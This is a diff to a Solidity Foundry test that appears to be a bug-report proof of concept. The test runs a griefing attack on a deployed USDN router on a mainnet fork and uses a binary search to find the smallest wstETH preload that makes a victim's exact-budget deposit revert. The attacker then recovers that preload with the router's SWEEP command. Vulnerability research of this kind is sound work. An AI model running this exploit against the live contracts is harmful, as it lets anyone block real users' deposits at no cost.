@@ -67,7 +67,9 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
     address internal constant ROUTER_ADDR = 0x49f66B1616865b2a59caECb8352bbf2AC80983e1;
     address internal constant PROTOCOL_ADDR = 0x656cB8C6d154Aad29d8771384089be5B5141f01a;
     address internal constant ATTACKER = address(0xB0B);
+    uint256 internal constant FORK_BLOCK = 25_715_274;
     uint256 internal constant INTENDED_DEPOSIT = 0.1 ether;
+    uint256 internal constant SEARCH_HIGH = 0.001 ether;
 
     IUniversalRouter internal router;
     IUsdnProtocol internal protocol;
@@ -79,7 +81,7 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
 
     function setUp() public {
         string memory rpc = vm.envString("MAINNET_RPC_URL");
-        vm.createSelectFork(rpc);
+        vm.createSelectFork(rpc, FORK_BLOCK);
 
         router = IUniversalRouter(ROUTER_ADDR);
         protocol = IUsdnProtocol(PROTOCOL_ADDR);
@@ -92,7 +94,7 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         uint128 lastTimestamp = protocol.getLastUpdateTimestamp();
         (, exactSdexBudget) = protocol.previewDeposit(INTENDED_DEPOSIT, lastPrice, lastTimestamp);
 
-        // Isolate Router custody from any unrelated historical dust at the selected fork block.
+        // Isolate Router custody from unrelated historical dust at this exact block.
         deal(address(asset), ROUTER_ADDR, 0);
         deal(address(sdex), ROUTER_ADDR, 0);
 
@@ -108,10 +110,49 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         emit log_named_uint("exact SDEX budget", exactSdexBudget);
     }
 
+    /// @dev Executes one victim attempt from the same baseline state and always rolls it back.
+    function _trial(uint256 preload) internal returns (bool success_) {
+        uint256 snap = vm.snapshotState();
+
+        if (preload > 0) {
+            deal(address(asset), ATTACKER, preload);
+            vm.prank(ATTACKER);
+            require(asset.transfer(ROUTER_ADDR, preload), "preload");
+        }
+
+        (success_,) = address(victim).call(
+            abi.encodeCall(VictimDepositWorkflow.run, (INTENDED_DEPOSIT, exactSdexBudget, securityDeposit))
+        );
+
+        bool reverted = vm.revertToState(snap);
+        require(reverted, "snapshot restore");
+    }
+
+    function _findMinimalRevertingPreload() internal returns (uint256 minimalPreload_) {
+        // Sanity boundaries: the clean route succeeds, while a bounded 0.001 wstETH preload must be large enough.
+        assertTrue(_trial(0), "clean victim route must succeed");
+        assertFalse(_trial(SEARCH_HIGH), "search upper bound must revert victim route");
+
+        uint256 lo;
+        uint256 hi = SEARCH_HIGH;
+        while (lo + 1 < hi) {
+            uint256 mid = (lo + hi) / 2;
+            if (_trial(mid)) {
+                lo = mid;
+            } else {
+                hi = mid;
+            }
+        }
+        minimalPreload_ = hi;
+
+        // Boundary proof: one wei less succeeds, exact threshold fails.
+        assertTrue(_trial(minimalPreload_ - 1), "threshold-1 must still succeed");
+        assertFalse(_trial(minimalPreload_), "threshold must revert");
+    }
+
     function test_control_exactOfficialBudgetSucceedsWithoutPreload() public {
         victim.run(INTENDED_DEPOSIT, exactSdexBudget, securityDeposit);
 
-        // The normal workflow is viable with exactly the quoted SDEX budget.
         assertEq(asset.balanceOf(ROUTER_ADDR), 0, "normal route leaves no asset dust");
         assertEq(sdex.balanceOf(ROUTER_ADDR), 0, "normal route leaves no SDEX dust");
 
@@ -123,36 +164,40 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         );
     }
 
-    function test_oneWeiPreloadRevertsOfficialRouteAndAttackerRecoversDust() public {
-        // Separate attacker transaction before the victim. The transfer is permissionless and costs 1 wei wstETH.
-        deal(address(asset), ATTACKER, 1);
+    function test_minimalRecoverablePreloadRevertsOfficialRoute() public {
+        uint256 minimalPreload = _findMinimalRevertingPreload();
+        emit log_named_uint("minimal reverting preload wei wstETH", minimalPreload);
+
+        // Execute the real attack once without rolling state back.
+        deal(address(asset), ATTACKER, minimalPreload);
         vm.prank(ATTACKER);
-        require(asset.transfer(ROUTER_ADDR, 1), "preload");
-        assertEq(asset.balanceOf(ROUTER_ADDR), 1, "attacker dust preloaded");
+        require(asset.transfer(ROUTER_ADDR, minimalPreload), "preload");
+        assertEq(asset.balanceOf(ROUTER_ADDR), minimalPreload, "attacker preload present");
 
         uint256 victimAssetBefore = asset.balanceOf(address(victim));
         uint256 victimSdexBefore = sdex.balanceOf(address(victim));
+        uint256 gasBefore = gasleft();
+        (bool ok,) = address(victim).call(
+            abi.encodeCall(VictimDepositWorkflow.run, (INTENDED_DEPOSIT, exactSdexBudget, securityDeposit))
+        );
+        uint256 victimCallGas = gasBefore - gasleft();
+        emit log_named_uint("reverted victim call gas", victimCallGas);
+        assertFalse(ok, "victim route must revert at minimal preload");
 
-        // CONTRACT_BALANCE makes the protocol see INTENDED_DEPOSIT + 1 wei.
-        // Current mainnet preview requires 119 extra wei SDEX for that one extra wei wstETH,
-        // but the official exact-output workflow budgeted SDEX for INTENDED_DEPOSIT only.
-        vm.expectRevert();
-        victim.run(INTENDED_DEPOSIT, exactSdexBudget, securityDeposit);
-
-        // All victim-side transfers were in the reverted transaction; only the attacker's prior 1 wei remains.
+        // Victim-side state rolled back; attacker's earlier preload remains in the shared Router.
         assertEq(asset.balanceOf(address(victim)), victimAssetBefore, "victim asset transfer reverted");
         assertEq(sdex.balanceOf(address(victim)), victimSdexBefore, "victim SDEX transfer reverted");
-        assertEq(asset.balanceOf(ROUTER_ADDR), 1, "only attacker preload survives victim revert");
-        assertEq(sdex.balanceOf(ROUTER_ADDR), 0, "victim SDEX does not remain in router");
+        assertEq(asset.balanceOf(ROUTER_ADDR), minimalPreload, "only attacker preload survives victim revert");
+        assertEq(sdex.balanceOf(ROUTER_ADDR), 0, "victim SDEX rolled back");
 
-        // Separate attacker transaction recovers the full preload, so the attack consumes no wstETH principal.
+        // Attacker recovers the entire preload through the public Router SWEEP command.
         bytes memory commands = abi.encodePacked(uint8(Commands.SWEEP));
         bytes[] memory inputs = new bytes[](1);
         inputs[0] = abi.encode(address(asset), ATTACKER, 0, 0);
         vm.prank(ATTACKER);
         router.execute(commands, inputs);
 
-        assertEq(asset.balanceOf(ATTACKER), 1, "attacker recovered 1 wei preload");
-        assertEq(asset.balanceOf(ROUTER_ADDR), 0, "router dust recovered");
+        assertEq(asset.balanceOf(ATTACKER), minimalPreload, "attacker recovered full preload principal");
+        assertEq(asset.balanceOf(ROUTER_ADDR), 0, "router preload recovered");
     }
 }
